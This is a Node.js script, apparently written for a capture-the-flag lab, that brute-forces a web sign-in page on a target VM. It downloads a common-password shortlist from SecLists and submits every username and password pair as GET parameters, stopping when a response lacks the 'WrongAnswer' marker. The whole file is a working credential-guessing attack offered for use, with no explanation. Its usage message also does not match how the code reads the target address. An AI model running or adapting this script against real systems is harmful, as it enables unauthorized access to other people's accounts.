const PASS_URL =
  "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/top-passwords-shortlist.txt";

async function customFetch(url) {
  const response = await fetch(url);
  return await response.text();
}

async function main() {
  const vmIp = process.env.VM_IP;

  if (!vmIp) {
    console.error("Usage: node script.js <vm-ip>");
    process.exit(1);
  }

  const usernames = [
    "one", "two", "three", "Flag",
    "me", "GetThe",
    "meone", "metwo", "methree", "GetTheFlag",
  ];

  const passwords = await customFetch(PASS_URL).then((text) =>
    text.trim().split("\n"),
  );

  await Promise.all(
    usernames.map(async (username) => {
      for (const password of passwords) {
        const html = await customFetch(
          `http://${vmIp}/?page=signin&username=${username}&password=${password}&Login=Login`,
        );
        if (!html.includes("WrongAnswer")) {
          console.log(`Correct answer: ${username} ${password}`);
          process.exit(0);
        }
        console.log(`Wrong answer: ${username} ${password}`);
      }
    }),
  );
}

main();